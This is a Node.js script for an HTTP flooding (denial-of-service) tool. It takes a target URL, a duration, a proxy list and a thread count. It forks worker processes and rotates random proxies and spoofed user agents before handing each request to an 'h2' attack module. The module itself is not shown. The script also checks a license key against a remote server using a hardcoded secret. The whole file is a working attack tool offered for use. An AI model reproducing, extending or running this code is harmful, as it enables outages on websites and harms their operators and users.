const os = require('os');
const cluster = require('cluster');
const fsPromises = require('fs/promises');
const UserAgent = require('user-agents');
var request = require('request');
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const { exec } = require("child_process");
const path = require('path');
const h2 = require('./h2.js');
//exec('curl -O https://sheesh.rip/http.txt --user-agent "hello bnt"')
if (process.argv.length < 6) {
    console.log('URL Time Proxies Threads');
    console.log('https://sheesh.rip/ 120 http.txt 5');
    process.exit(0);
}

function getKeyFromFile(filePath) {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return data.trim();
  } catch (error) {
    process.exit()
    return null;
  }
}

function getKeyFromWebsite(secretKey, filePath, callback) {
  const key = getKeyFromFile(filePath);
  if (!key) {
    process.exit()
    return;
  }

  const options = {
    url: 'https://key.sheesh.rip/checkkey?key=' + key,
    headers: {
      'Validation': secretKey,
      'User-Agent': 'bntkeyChecker'      
    }
  };

  request(options, function(error, response, body) {
    if (error) {
      process.exit()
    } else {
      const isValid = JSON.parse(body).valid;
      callback(null, key, isValid);
    }
  });
}

getKeyFromWebsite('8002f2522e87f06ec50193551978118d77e7a67154da5558ec5ca1f4ddfd9e4de5dfaa127caa52198b29d26fe637d2ee', 'bntkey.txt', function(error, key, isValid) {
  if (error) {
    console.error(error);
  } else if (isValid) {
    console.log('Key is valid');
  } else {
    console.error('Key is invalid');
    process.exit()
  }
});


const target = process.argv[2], time = process.argv[3], proxy = process.argv[4]; threads = process.argv[5];
//process.on('uncaughtException', function (err) {});
setTimeout(() => {
  process.exit()
}, time*1000);
proxies = fs.readFileSync(proxy, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
        
if (cluster.isPrimary) {
  for (let i = 0; i < threads; i++) cluster.fork();
  setTimeout(() => process.exit(0), Number(time) * 1000);
} else {
  function run() {
  const userAgentv2 = new UserAgent();
  var useragent = userAgentv2.toString();
  const proxer = proxies[~~(Math.random() * (proxies.length - 1))];
  request({
  'url':'https://www.google.com',
  'method': "GET",
  'proxy':'http://'+proxer,
},function (error, response, body) {
  if (!error) {
    h2(target, 'v=1', useragent, proxer, null);
  } else { run() }
}) 
}
run()
}